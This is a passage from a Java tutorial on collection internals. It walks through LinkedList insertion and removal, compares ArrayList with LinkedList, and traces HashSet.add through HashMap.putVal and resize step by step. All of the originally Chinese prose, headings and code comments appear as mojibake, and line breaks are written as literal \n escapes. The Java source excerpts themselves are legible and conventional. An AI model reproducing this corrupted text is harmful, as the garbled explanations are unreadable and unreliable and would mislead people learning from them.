//å¦‚æœpredèŠ‚ç‚¹ä¸ä¸ºnullï¼Œåˆ™è®¾ç½®åŸå…ˆindexä½ç½®çš„èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºå½“å‰æ–°èŠ‚ç‚¹\n      pred.next = newNode;\n    //ä¸€ä¸ªæ–°èŠ‚ç‚¹å®Œæˆåï¼Œè®¾ç½®ä¸Šä¸€ä¸ªä¸ºå½“å‰æ–°èŠ‚ç‚¹ï¼Œç›´åˆ°æŠŠæ‰€æœ‰å…ƒç´ æ‹†å…¥å®Œæˆ    \n    pred = newNode;\n  }\n  //indexä½ç½®çš„åŸå…ˆèŠ‚ç‚¹ä¸ºnull,åˆ™ä»£è¡¨indexåŸå…ˆçš„å‰ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ™è®¾ç½®æœ€åä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯æœ€æ–°æœ€åçš„é‚£ä¸ªèŠ‚ç‚¹\n  if (succ == null) {\n    last = pred;\n  } else {\n    //indexä½ç½®çš„åŸå…ˆèŠ‚ç‚¹ä¸ä¸ºnullï¼Œåˆ™è®¾ç½®æ‹†å…¥æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹çš„nextæ˜¯succ,succçš„å‰ä¸€ä¸ªæ˜¯å½“å‰è¿™ä¸ª\n    pred.next = succ;\n    succ.prev = pred;\n  }\n  //å¾—åˆ°æ–°é“¾è¡¨å…ƒç´ çš„æ•°é‡\n  size += numNew;\n  //é“¾è¡¨æ”¹åŠ¨æ¬¡æ•°+1\n  modCount++;\n  return true;\n}\n```\n\n##### æ‰©å±•çš„æ–¹æ³•\n\nå¦‚ä¸‹æ–¹æ³•éƒ½æ˜¯åŸºäºä¸Šé¢æ–¹æ³•æ‰©å±•å‡ºæ¥çš„\n\n```java\npublic void addFirst(E e) {\n    linkFirst(e);\n}\npublic void addLast(E e) {\n    linkLast(e);\n}\npublic boolean offer(E e) {\n    return add(e);\n}\npublic boolean offerFirst(E e) {\n    addFirst(e);\n    return true;\n}\npublic boolean offerLast(E e) {\n    addLast(e);\n    return true;\n}\npublic void push(E e) {\n    addFirst(e);\n}\n```\n\n#### åˆ é™¤ç»“ç‚¹\n\n##### åˆ é™¤å•ä¸ªç»“ç‚¹\n\n```java\n//é»˜è®¤åˆ é™¤\npublic E remove() {\n  return removeFirst();//è°ƒç”¨åˆ é™¤å¤´ç»“ç‚¹çš„æ–¹æ³•\n}\n\n//æ ¹æ®ç´¢å¼•åˆ é™¤\npublic E remove(int index) {\n  //ä¸‹æ ‡éƒ½å…ˆåˆ¤æ–­ä¸‹æ ‡æ˜¯å¦è¶Šç•Œï¼Œè¶Šç•Œå°±æŠ›å‡ºå¼‚å¸¸\n  checkElementIndex(index);\n  return unlink(node(index));//è°ƒç”¨åˆ é™¤ä¸­é—´ç»“ç‚¹çš„æ–¹æ³•\n}\n\n//æ‰¾åˆ°éœ€è¦åˆ é™¤çš„èŠ‚ç‚¹\nNode<E> node(int index) {\n  // assert isElementIndex(index);\n  //äºŒåˆ†æŸ¥æ‰¾çš„æ€æƒ³ï¼Œåˆ¤æ–­ä¸€ä¸‹æ˜¯åœ¨é“¾è¡¨çš„å‰åŠéƒ¨åˆ†è¿˜æ˜¯ååŠéƒ¨åˆ†\n  if (index < (size >> 1)) {\n    //ä»å¤´èŠ‚ç‚¹ä¸€ç›´æ‰¾åˆ°indexä½ç½®æ‹¿åˆ°èŠ‚ç‚¹\n    Node<E> x = first;\n    for (int i = 0; i < index; i++)\n      x = x.next;\n    return x;\n  } else {\n    //ä»å°¾èŠ‚ç‚¹ä¸€ç›´æ‰¾åˆ°indexä½ç½®æ‹¿åˆ°èŠ‚ç‚¹\n    Node<E> x = last;\n    for (int i = size - 1; i > index; i--)\n      x = x.prev;\n    return x;\n  }\n}\n```\n\n##### åˆ é™¤å¤´èŠ‚ç‚¹\n\n```java\nprivate E unlinkFirst(Node<E> f) {\n    // assert f == first && f != null;\n    final E element = f.item;\n    final Node<E> next = f.next;\n    // ç›¸åº”æ•°æ®è®¾ä¸º nullï¼Œä»è€Œä¹‹åGCæ¸…ç†\n    f.item = null;\n    f.next = null; // help GC\n    first = next;\n    // å°±ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ å®Œäº†\n    if (next == null)\n        last = null;\n    else\n        next.prev = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n##### åˆ é™¤å°¾èŠ‚ç‚¹\n\n```java\nprivate E unlinkLast(Node<E> l) {\n    // assert l == last && l != null;\n    final E element = l.item;\n    final Node<E> prev = l.prev;\n    // ç›¸åº”æ•°æ®è®¾ä¸º nullï¼Œä»è€Œä¹‹åGCæ¸…ç†\n    l.item = null;\n    l.prev = null; // help GC\n    last = prev;\n    // å°±ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ å®Œäº†\n    if (prev == null)\n        first = null;\n    else\n        prev.next = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n##### åˆ é™¤ä¸­é—´èŠ‚ç‚¹\n\n```java\nE unlink(Node<E> x) {\n    // assert x != null;\n    final E element = x.item;\n    final Node<E> next = x.next;\n    final Node<E> prev = x.prev;\n    // ä¸ºå¤´èŠ‚ç‚¹ï¼Œåˆ™è®¾ç½®æ–°å¤´èŠ‚ç‚¹\n    if (prev == null) {\n        first = next;\n    } else {\n        prev.next = next;\n        x.prev = null;\n    }\n    // ä¸ºå°¾èŠ‚ç‚¹ï¼Œåˆ™è®¾ç½®æ–°å°¾èŠ‚ç‚¹\n    if (next == null) {\n        last = prev;\n    } else {\n        next.prev = prev;\n        x.next = null;\n    }\n\n    x.item = null;\n    size--;\n    modCount++;\n    return element;\n}\n```\n\n##### æ‰©å±•çš„æ–¹æ³•\n\nå’Œå¢åŠ ä¸€æ ·ï¼Œåˆ é™¤ä¹Ÿæœ‰å¾ˆå¤šæ‰©å±•ç‰ˆæœ¬ï¼Œä¸è¿‡åŸºç¡€è¿˜æ˜¯ä¸Šé¢ä¸‰ä¸ªæ–¹æ³•ã€‚\n\n```java\npublic E removeFirst() {\n    final Node<E> f = first;\n    if (f == null)\n        throw new NoSuchElementException();\n    return unlinkFirst(f);\n}\npublic E removeLast() {\n    final Node<E> l = last;\n    if (l == null)\n        throw new NoSuchElementException();\n    return unlinkLast(l);\n}\npublic E pollFirst() {\n    final Node<E> f = first;\n    return (f == null) ? null : unlinkFirst(f);\n}\npublic E pollLast() {\n    final Node<E> l = last;\n    return (l == null) ? null : unlinkLast(l);\n}\npublic E pop() {\n    return removeFirst();\n}\n```\n\n#### æ›´æ–°ç»“ç‚¹\n\n```java\npublic E set(int index, E element) {\n    // ä¸‹æ ‡åˆæ³•æ€§æ£€æŸ¥\n    checkElementIndex(index);\n    // è·å–indexä¸‹æ ‡èŠ‚ç‚¹\n    Node<E> x = node(index);\n    // è·å–æ—§å€¼\n    E oldVal = x.item;\n    // è®¾ç½®æ–°å€¼\n    x.item = element;\n    // è¿”å›æ—§å€¼\n    return oldVal;\n}\n\n// é‡‡ç”¨äºŒåˆ†æ³•éå†æ¯ä¸ªNodeèŠ‚ç‚¹ï¼Œç›´åˆ°æ‰¾åˆ°indexä½ç½®çš„èŠ‚ç‚¹\nNode<E> node(int index) {\n    // assert isElementIndex(index);\n\n    if (index < (size >> 1)) {\n        Node<E> x = first;\n        for (int i = 0; i < index; i++)\n            x = x.next;\n        return x;\n    } else {\n        Node<E> x = last;\n        for (int i = size - 1; i > index; i--)\n            x = x.prev;\n        return x;\n    }\n}\n\n```\n\n#### æŸ¥æ‰¾ç»“ç‚¹\n\n```java\npublic E get(int index) {\n    checkElementIndex(index);\n    return node(index).item;\n}\n\n// é‡‡ç”¨äºŒåˆ†æ³•éå†æ¯ä¸ªNodeèŠ‚ç‚¹ï¼Œç›´åˆ°æ‰¾åˆ°indexä½ç½®çš„èŠ‚ç‚¹\nNode<E> node(int index) {\n    // assert isElementIndex(index);\n\n    if (index < (size >> 1)) {\n        Node<E> x = first;\n        for (int i = 0; i < index; i++)\n            x = x.next;\n        return x;\n    } else {\n        Node<E> x = last;\n        for (int i = size - 1; i > index; i--)\n            x = x.prev;\n        return x;\n    }\n}\n```\n\n### ArrayListå’ŒLinkedListæ¯”è¾ƒ\n\n|            | åº•å±‚ç»“æ„ | å¢åˆ æ•ˆç‡       | æ”¹æŸ¥æ•ˆç‡ |\n| ---------- | -------- | -------------- | -------- |\n| ArrayList  | å¯å˜æ•°ç»„ | è¾ƒä½ï¼Œæ•°ç»„æ‰©å®¹ | è¾ƒé«˜     |\n| LinkedList | åŒå‘é“¾è¡¨ | è¾ƒé«˜ï¼Œé“¾è¡¨è¿½åŠ  | è¾ƒä½     |\n\n- å¦‚æœæˆ‘ä»¬æ”¹æŸ¥çš„æ“ä½œå¤šï¼Œé€‰æ‹© ArrayList \n- å¦‚æœæˆ‘ä»¬å¢åˆ çš„æ“ä½œå¤šï¼Œé€‰æ‹© LinkedList\n- ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ç¨‹åºä¸­ï¼Œ80%-90% éƒ½æ˜¯æŸ¥è¯¢ï¼Œå› æ­¤å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¼šé€‰æ‹© ArrayList\n- åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œæ ¹æ®ä¸šåŠ¡çµæ´»é€‰æ‹©ï¼Œä¹Ÿå¯èƒ½è¿™æ ·ï¼Œä¸€ä¸ªæ¨¡å—ä½¿ç”¨çš„æ˜¯ ArrayListï¼Œå¦å¤–ä¸€ä¸ªæ¨¡å—æ˜¯ LinkedListï¼Œè¦æ ¹æ®ä¸šåŠ¡æ¥è¿›è¡Œé€‰æ‹©\n\n## IIã€Set\n\n### ç‰¹ç‚¹\n\nSet æ¥å£æ˜¯ Collection æ¥å£çš„å­æ¥å£\n\n- **æ— åºæ€§**ï¼šæ— åºï¼ˆæ·»åŠ å’Œå–å‡ºé¡ºåºä¸ä¸€è‡´ï¼‰ï¼Œå–å‡ºçš„é¡ºåºçš„é¡ºåºè™½ç„¶ä¸æ˜¯æ·»åŠ çš„é¡ºåºï¼Œä½†æ˜¯æ¯æ¬¡å–å‡ºé¡ºåºæ˜¯å›ºå®šçš„\n- **ä¸é‡å¤æ€§**ï¼šä¸å…è®¸é‡å¤å…ƒç´ ï¼Œå› æ­¤æœ€å¤šåªåŒ…å«ä¸€ä¸ª null\n\n```java\nSet set = new HashSet();\nset.add(\"jack\");\nset.add(\"lucy\");\nset.add(\"jack\");//é‡å¤ï¼Œæ·»åŠ ä¸æˆåŠŸ\nset.add(\"jwt\");\nset.add(null);\nset.add(null);//å†æ¬¡æ·»åŠ nullï¼Œæ·»åŠ ä¸æˆåŠŸ\nfor(int i = 0; i <3;i ++) {\n  System.out.println(\"set=\" + set);\n}\n\n/*\nset=[null, jwt, lucy, jack]\nset=[null, jwt, lucy, jack]\nset=[null, jwt, lucy, jack]\n*/\n```\n\n- ä¸èƒ½ä½¿ç”¨ç´¢å¼•çš„æ–¹å¼æ¥è·å–\n\n- Set æ¥å£å®ç°ç±»å¸¸ç”¨çš„æœ‰ï¼šHashSetã€LinkedHashSetã€TreeSet\n\n### éå†æ–¹å¼\n\nåŒ Collection çš„éå†æ–¹å¼ä¸€æ ·ï¼Œå› ä¸º Set æ¥å£æ˜¯ Collection æ¥å£çš„å­æ¥å£ã€‚\n\n- 1.å¯ä»¥ä½¿ç”¨è¿­ä»£å™¨\n- 2.å¢å¼º for\n\n```java\npackage com.jwt.set_;\n\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.Set;\n\n\npublic class SetMethod {\n    public static void main(String[] args) {\n        Set set = new HashSet();\n        set.add(\"jack\");\n        set.add(\"lucy\");\n        set.add(\"jwt\");\n        set.add(null);\n \n        System.out.println(\"=====ä½¿ç”¨è¿­ä»£å™¨====\");\n        Iterator iterator = set.iterator();\n        while (iterator.hasNext()) {\n            Object obj = iterator.next();\n            System.out.println(\"obj=\" + obj);\n        }\n        set.remove(null);\n        //æ–¹å¼2: å¢å¼ºfor\n        System.out.println(\"=====å¢å¼ºfor====\");\n        for (Object o : set) {\n            System.out.println(\"o=\" + o);\n        }\n\n    }\n}\n```\n\n## 2.1 HashSet\n\n###  ç‰¹ç‚¹\n\n- HashSet å®ç°äº† Set æ¥å£\n- HashSet åº•å±‚å®é™…ä¸Šæ˜¯ HashMapï¼ŒHashMap åº•å±‚æ˜¯æ•°ç»„ + é“¾è¡¨ + çº¢é»‘æ ‘\n\n```java\npublic HashSet() {\n    map = new HashMap<>();\n}\n```\n\n- **ä¸é‡å¤æ€§**ï¼šHashSet å¯ä»¥å­˜æ”¾ null å€¼ï¼Œä½†æ˜¯åªèƒ½æœ‰ä¸€ä¸ª nullï¼Œä¸èƒ½æœ‰é‡å¤å…ƒç´ /å¯¹è±¡ï¼Œä¸‹é¢ä¼šè¯¦ç»†åˆ†æ\n\n```java\nHashSet hashSet = new HashSet();\nhashSet.add(null);\nhashSet.add(null);//æ·»åŠ å¤±è´¥\n```\n\n- **æ— åºæ€§**ï¼šHashSet ä¸ä¿è¯å…ƒç´ æ˜¯æœ‰åºçš„(å³ï¼Œä¸ä¿è¯å­˜æ”¾å…ƒç´ çš„æ’å…¥é¡ºåºå’Œå–å‡ºé¡ºåºä¸€è‡´)\n\n```java\nHashSet<String> hashSet = new HashSet<>();\nhashSet.add(\"æ·±åœ³\");\nhashSet.add(\"åŒ—äº¬\");\nhashSet.add(\"è¥¿å®‰\");\n// å¾ªç¯æ‰“å° HashSet ä¸­çš„æ‰€æœ‰å…ƒç´ \nhashSet.forEach(m -> System.out.println(m));\n\n/*\nè¥¿å®‰\nåŒ—äº¬\næ·±åœ³\n*/\n//HashSet æ’å…¥çš„é¡ºåºæ˜¯ï¼šæ·±åœ³ -> åŒ—äº¬ -> è¥¿å®‰ï¼Œè€Œå¾ªç¯æ‰“å°çš„é¡ºåºå´æ˜¯ï¼šè¥¿å®‰ -> æ·±åœ³ -> åŒ—äº¬ï¼Œæ‰€ä»¥ HashSet æ˜¯æ— åºçš„ï¼Œä¸èƒ½ä¿è¯æ’å…¥å’Œè¿­ä»£çš„é¡ºåºä¸€è‡´ã€‚\n```\n\n### æ·»åŠ å…ƒç´ æœºåˆ¶\n\n#### ç»“è®º\n\n- HashSet åº•å±‚æ˜¯ HashMapï¼ŒHashMap åº•å±‚æ˜¯æ•°ç»„ + é“¾è¡¨ + çº¢é»‘æ ‘\n- æ·»åŠ ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå…ˆè®¡ç®— hash å€¼ï¼Œå¾—å‡ºç´¢å¼•å€¼ï¼Œæ‰¾åˆ°å­˜å‚¨æ•°æ®è¡¨ tableï¼Œçœ‹è¿™ä¸ªç´¢å¼•ä½ç½®æ˜¯å¦å·²ç»å­˜æ”¾å…ƒç´ ï¼Œå¦‚æœæ²¡æœ‰ï¼Œç›´æ¥åŠ å…¥ï¼›å¦‚æœæœ‰ï¼Œè°ƒç”¨ equals æ¯”è¾ƒ\n  - å¦‚æœç›¸åŒï¼Œå°±æ”¾å¼ƒæ·»åŠ ï¼›\n  - å¦‚æœä¸ç›¸åŒï¼Œåˆ™æ·»åŠ åˆ°æœ€åï¼Œå½¢æˆé“¾è¡¨\n- åœ¨ Java 8 ä¸­ï¼Œå¦‚æœä¸€æ¡é“¾è¡¨çš„å…ƒç´ ä¸ªæ•°è¶…è¿‡ TREEIFY_THRESHOLD(é»˜è®¤æ˜¯8)ï¼Œå¹¶ä¸” table çš„å¤§å° >= MIN_TREEIFY_CAPACITY(é»˜è®¤64)ï¼Œå°±ä¼šè¿›è¡Œæ ‘åŒ–(çº¢é»‘æ ‘)\n\n#### æºç åˆ†æ\n\n```java\n//debugå¦‚ä¸‹ä»£ç \nimport java.util.HashSet;\npublic class HashSetSource {\n    public static void main(String[] args) {\n        HashSet hashSet = new HashSet();\n        hashSet.add(\"java\");//ç¬¬ä¸€æ¬¡\n        hashSet.add(\"java\");//ç¬¬äºŒæ¬¡\n        System.out.println(\"set=\" + hashSet);\n    }\n\n}\n```\n\n##### Step1\n\næ‰§è¡Œ` HashSet hashSet = new HashSet();`\n\n```java\n//è¯¥æ­¥éª¤åº•å±‚ä»£ç \npublic HashSet() {\n    map = new HashMap<>();\n}\n\npublic HashMap() {\n \t this.loadFactor = DEFAULT_LOAD_FACTOR; \n}\n\n//å…¶ä»–æ„é€ æ–¹æ³•\n//æŒ‡å®šé›†åˆè½¬åŒ–ä¸ºHashSet, å®Œæˆmapçš„åˆ›å»º\npublic HashSet(Collection<? extends E> c) {\n   map = new HashMap<>(Math.max((int) (c.size()/.75f) + 1, 16));\n   addAll(c);\n}\n//æŒ‡å®šåˆå§‹åŒ–å¤§å°ï¼Œå’Œè´Ÿè½½å› å­\npublic HashSet(int initialCapacity, float loadFactor) {\n    map = new HashMap<>(initialCapacity, loadFactor);\n}\n//æŒ‡å®šåˆå§‹åŒ–å¤§å°\npublic HashSet(int initialCapacity) {\n    map = new HashMap<>(initialCapacity);\n}\n//æŒ‡å®šåˆå§‹åŒ–å¤§å°å’Œè´Ÿè½½å› å­ï¼Œdummy æ— å®é™…æ„ä¹‰\nHashSet(int initialCapacity, float loadFactor, boolean dummy) {\n    map = new LinkedHashMap<>(initialCapacity, loadFactor);\n}\n```\n\n##### Step2\n\næ‰§è¡Œ`hashSet.add(\"java\");`\n\n```java\n//1ã€æ‰§è¡Œadd()ï¼Œè°ƒç”¨put()\npublic boolean add(E e) {\n\t\treturn map.put(e, PRESENT)==null;// hashmap ä¸­ put() è¿”å› null æ—¶ï¼Œè¡¨ç¤ºæ“ä½œæˆåŠŸ\n}\n\n// è™šæ‹Ÿå¯¹è±¡\nprivate static final Object PRESENT = new Object();\n//HashSetæ˜¯é€šè¿‡HashMapæ¥ä¿å­˜å…ƒç´ ï¼Œç”±äºåªéœ€è¦åœ¨keyä¸­ä¿å­˜ï¼Œæ‰€ä»¥é‡‡ç”¨è™šæ‹Ÿå¯¹è±¡PRESENTå¯¹åº”mapä¸­æ’å…¥key-valueçš„valueå€¼çš„å¼•ç”¨ã€‚æ¯æ¬¡å‘mapä¸­æ·»åŠ å…ƒç´ æ—¶ï¼Œé”®å€¼å¯¹å¯¹åº”çš„valueéƒ½æ˜¯PRESENTã€‚\n\n\n//2ã€æ‰§è¡Œput()ï¼Œè°ƒç”¨hash()å’ŒputVal()\npublic V put(K key, V value) {\n  \treturn putVal(hash(key), key, value, false, true);\n}\n\n//3ã€æ‰§è¡Œhash()ï¼Œè°ƒç”¨hashCode()\nstatic final int hash(Object key) {\n  \tint h;\n  \treturn (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);//å¹¶ä¸æ˜¯ç›´æ¥è¿”å›hashå€¼ï¼Œåšäº†å¤„ç†ï¼Œä¸ºäº†é¿å…hashç¢°æ’\n}//å…ˆè®¡ç®—keyçš„hashå€¼ï¼Œå†è®¡ç®—è¯¥hashå€¼æ— ç¬¦å·å³ç§»16ä½çš„å€¼ï¼Œå†å°†ä¸¤è€…è¿›è¡Œ^æŒ‰ä½å¼‚æˆ–\n\n//4ã€æ‰§è¡ŒhashCode()ï¼Œè®¡ç®—keyçš„hashå€¼\npublic int hashCode() {\n  int h = hash;\n  if (h == 0 && value.length > 0) {\n    char val[] = value;\n    for (int i = 0; i < value.length; i++) {\n      h = 31 * h + val[i];\n    }\n    hash = h;\n  }\n  return h;\n}\n\n//5.æ‰§è¡ŒputVal()\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n    Node<K,V>[] tab; Node<K,V> p; int n, i;//å®šä¹‰äº†è¾…åŠ©å˜é‡\n    //tableæ˜¯HashMapçš„ä¸€ä¸ªå±æ€§ï¼Œå­˜æ”¾ç»“ç‚¹çš„ï¼Œç±»å‹æ˜¯Node[]\n    //è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡æ‰©å®¹ï¼Œåˆ°16ä¸ªç©ºé—´.\n    if ((tab = table) == null || (n = tab.length) == 0)\n      //å¦‚æœå“ˆå¸Œè¡¨ä¸ºç©ºï¼Œè°ƒç”¨resize(),åˆ›å»ºä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¹¶ç”¨å˜é‡nè®°å½•å“ˆå¸Œè¡¨é•¿åº¦\n      n = (tab = resize()).length;//æ‰§è¡Œå®Œresize(),tabå¤§å°ä¸º16\n  \n     //(1)æ ¹æ®keyï¼Œå¾—åˆ°hash å»è®¡ç®—è¯¥key åº”è¯¥å­˜æ”¾åˆ°table è¡¨çš„å“ªä¸ªç´¢å¼•ä½ç½®\n    //å¹¶æŠŠè¿™ä¸ªä½ç½®çš„å¯¹è±¡ï¼Œèµ‹ç»™p\n    //(2)åˆ¤æ–­pæ˜¯å¦ä¸ºnull\n    //(2.1) å¦‚æœpä¸ºnull, è¡¨ç¤ºè¿˜æ²¡æœ‰å­˜æ”¾å…ƒç´ , å°±åˆ›å»ºä¸€ä¸ªNode (key=\"java\",value=PRESENT)\n    //(2.2) å°±æ”¾åœ¨è¯¥ä½ç½®tab[i] = newNode(hash, key, value, null)\n    if ((p = tab[i = (n - 1) & hash]) == null)\n      tab[i] = newNode(hash, key, value, null);\n  \t/*ç¬¬ä¸€æ¬¡addéƒ½ä¸æ‰§è¡Œ\n    else {\n      Node<K,V> e; K k;\n      if (p.hash == hash &&\n          ((k = p.key) == key || (key != null && key.equals(k))))\n        e = p;\n      else if (p instanceof TreeNode)//ç¬¬ä¸€æ¬¡addä¸è¿›å…¥\n        e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n      else {\n        for (int binCount = 0; ; ++binCount) {\n          if ((e = p.next) == null) {\n            p.next = newNode(hash, key, value, null);\n            if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st\n              treeifyBin(tab, hash);\n            break;\n          }\n          if (e.hash == hash &&\n              ((k = e.key) == key || (key != null && key.equals(k))))\n            break;\n          p = e;\n        }\n      }\n      if (e != null) { // existing mapping for key\n        V oldValue = e.value;\n        if (!onlyIfAbsent || oldValue == null)\n          e.value = value;\n        afterNodeAccess(e);\n        return oldValue;\n      }\n    }*/\n    ++modCount;\n    if (++size > threshold)//æ¯åŠ å…¥ä¸€ä¸ªç»“ç‚¹Node(k,v,h,next), size++\n      resize();\n    afterNodeInsertion(evict);//ç©ºæ–¹æ³•ï¼ŒHashMapç•™ç»™å­ç±»å»å®ç°\n    return null;\n}\n\n//åˆ›å»ºä¸€ä¸ªå“ˆå¸Œè¡¨æˆ–è€…æ‰©å®¹å“ˆå¸Œè¡¨\nfinal Node<K,V>[] resize() {\n        Node<K,V>[] oldTab = table;\n        int oldCap = (oldTab == null) ? 0 : oldTab.length;\n        int oldThr = threshold;\n        int newCap, newThr = 0;\n        if (oldCap > 0) {\n            if (oldCap >= MAXIMUM_CAPACITY) {\n                threshold = Integer.MAX_VALUE;\n                return oldTab;\n            }\n            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                     oldCap >= DEFAULT_INITIAL_CAPACITY)\n                newThr = oldThr << 1; // double threshold\n        }\n        else if (oldThr > 0) // initial capacity was placed in threshold\n            newCap = oldThr;\n        else {               // zero initial threshold signifies using defaults\n            newCap = DEFAULT_INITIAL_CAPACITY;//é»˜è®¤å®¹é‡\n            //static final int DEFAULT_INITIAL_CAPACITY = 1 << 4; //é»˜è®¤å€¼16\n            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);//ä¸´ç•Œå€¼\n            //static final float DEFAULT_LOAD_FACTOR = 0.75f;//åŠ è½½å› å­0.75\n           //ä¸´ç•Œå€¼=åŠ è½½å› å­(0.75)*é»˜è®¤å®¹é‡\n        }\n        if (newThr == 0) {\n            float ft = (float)newCap * loadFactor;\n            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                      (int)ft : Integer.MAX_VALUE);\n        }\n        threshold = newThr;//ä¸´ç•Œå€¼\n        @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n        Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];//æ–°å»ºå®¹é‡ä¸º16çš„èŠ‚ç‚¹æ•°ç»„\n        table = newTab;//æŠŠå»ºå¥½çš„æ•°ç»„èµ‹ç»™table\n        if (oldTab != null) {\n            for (int j = 0; j < oldCap; ++j) {\n                Node<K,V> e;\n                if ((e = oldTab[j]) != null) {\n                    oldTab[j] = null;\n                    if (e.next == null)\n                        newTab[e.hash & (newCap - 1)] = e;\n                    else if (e instanceof TreeNode)\n                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n                    else { // preserve order\n                        Node<K,V> loHead = null, loTail = null;\n                        Node<K,V> hiHead = null, hiTail = null;\n                        Node<K,V> next;\n                        do {\n                            next = e.next;\n                            if ((e.hash & oldCap) == 0) {\n                                if (loTail == null)\n                                    loHead = e;\n                                else\n                                    loTail.next = e;\n                                loTail = e;\n                            }\n                            else {\n                                if (hiTail == null)\n                                    hiHead = e;\n                                else\n                                    hiTail.next = e;\n                                hiTail = e;\n                            }\n                        } while ((e = next) != null);\n                        if (loTail != null) {\n                            loTail.next = null;\n                            newTab[j] = loHead;\n                        }\n                        if (hiTail != null) {\n                            hiTail.next = null;\n                            newTab[j + oldCap] = hiHead;\n                        }\n                    }\n                }\n            }\n        }\n        return newTab;\n    }\n```\n\n##### Step3\n\næ‰§è¡Œ`hashSet.add(\"java\");//ç¬¬äºŒæ¬¡`\n\n```java\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n  Node<K,V>[] tab; Node<K,V> p; int n, i;\n  /*ç¬¬äºŒæ¬¡addä¸æ‰§è¡Œ\n  if ((tab = table) == null || (n = tab.length) == 0)\n    n = (tab = resize()).length;\n  if ((p = tab[i = (n - 1) & hash]) == null)\n    tab[i] = newNode(hash, key, value, null);\n  */\n  else {\n    Node<K,V> e; K k;\n    //å¦‚æœå½“å‰ç´¢å¼•ä½ç½®å¯¹åº”çš„é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ å’Œå‡†å¤‡æ·»åŠ çš„keyçš„hashå€¼ä¸€æ ·\n    //å¹¶ä¸”æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ä¹‹ä¸€\n    //1.å‡†å¤‡åŠ å…¥çš„keyå’ŒpæŒ‡å‘çš„Nodeç»“ç‚¹çš„keyæ˜¯åŒä¸€ä¸ªå¯¹è±¡\n    //2.pæŒ‡å‘çš„Nodeç»“ç‚¹çš„keyçš„equals()å’Œå‡†å¤‡åŠ å…¥çš„keyæ¯”è¾ƒåç›¸åŒ\n    //å°±ä¸èƒ½åŠ å…¥\n    if (p.hash == hash &&\n        ((k = p.key) == key || (key != null && key.equals(k))))\n      e = p;\n    //å†åˆ¤æ–­pæ˜¯ä¸æ˜¯ä¸€é¢—çº¢é»‘æ ‘\n    //å¦‚æœæ˜¯ä¸€é¢—çº¢é»‘æ ‘ï¼Œå°±è°ƒç”¨putTreeValï¼Œæ¥è¿›è¡Œæ·»åŠ \n    else if (p instanceof TreeNode)\n      e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n    //å¦‚æœtableå¯¹åº”ç´¢å¼•ä½ç½®ï¼Œå·²ç»æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œå°±ç”¨forå¾ªç¯æ¯”è¾ƒ\n    else {\n      for (int binCount = 0; ; ++binCount) {\n        //ä¾æ¬¡å’Œè¯¥é“¾è¡¨çš„æ¯ä¸€ä¸ªå…ƒç´ æ¯”è¾ƒåï¼Œéƒ½ä¸ç›¸åŒï¼Œåˆ™åŠ å…¥åˆ°è¯¥é“¾è¡¨æœ€å\n        if ((e = p.next) == null) {\n          p.next = newNode(hash, key, value, null);\n          //æ³¨æ„åœ¨æŠŠå…ƒç´ æ·»åŠ åˆ°é“¾è¡¨åï¼Œç«‹å³åˆ¤æ–­è¯¥é“¾è¡¨æ˜¯å¦å·²ç»è¾¾åˆ°8ä¸ªç»“ç‚¹ \n          if (binCount >= TREEIFY_THRESHOLD - 1) // 8-1\n            //å°±è°ƒç”¨treeifyBin(),å¯¹å½“å‰è¿™ä¸ªé“¾è¡¨è¿›è¡Œæ ‘åŒ–(è½¬æˆçº¢é»‘æ ‘)\n            treeifyBin(tab, hash);\n            //æ³¨æ„ï¼Œè½¬æˆçº¢é»‘æ ‘æ—¶ï¼Œè¦è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœè¯¥tableæ•°ç»„çš„å¤§å°>64,å°äºåˆ°è¯å…ˆæ‰©å®¹å†è½¬æˆçº¢é»‘æ ‘\n          break;\n        }\n        //ä¾æ¬¡å’Œè¯¥é“¾è¡¨çš„æ¯ä¸ªå…ƒç´ æ¯”è¾ƒè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœ‰ç›¸åŒæƒ…å†µ,å°±ç›´æ¥break\n        if (e.hash == hash &&\n            ((k = e.key) == key || (key != null && key.equals(k))))\n          break;\n        p = e;//på¾€åç§»\n      }\n    }\n    if (e != null) { // existing mapping for key\n      V oldValue = e.value;\n      if (!onlyIfAbsent || oldValue == null)\n        e.value = value;\n      afterNodeAccess(e);\n      return oldValue;\n    }\n  }\n  ++modCount;\n  if (++size > threshold)\n    resize();\n  afterNodeInsertion(evict);\n  return null;\n}\n```\n\n###  æ‰©å®¹æœºåˆ¶\n\n#### ç»“è®º\n\n- HashSet 